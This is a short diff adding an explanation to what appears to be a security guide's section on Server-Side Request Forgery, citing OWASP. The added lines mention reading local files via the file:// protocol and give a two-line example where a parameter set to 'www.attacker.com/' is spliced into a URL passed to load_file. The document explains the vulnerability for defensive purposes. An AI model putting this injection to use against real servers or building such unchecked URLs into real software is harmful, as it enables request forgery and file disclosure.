@@ -1052,7 +1052,11 @@ OWASP Testing Guide: Test Application Platform Configuration
 https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
 
 Wherein a malicious actor can manipulate a parameter on the web application
-to create or control requests from a vulnerable server.
+to create or control requests from a vulnerable server, e.g.: use the file://
+protocol, accepted by default in many cases, to read any file on the filesystem.
+    department = 'www.attacker.com/'
+    load_file('https://' + department + '-office.secureflag/gates/config.ini')
+
 
 Attackers often use these attacks to target internal systems that are
 inaccessible from the external network due to the use of a firewall.
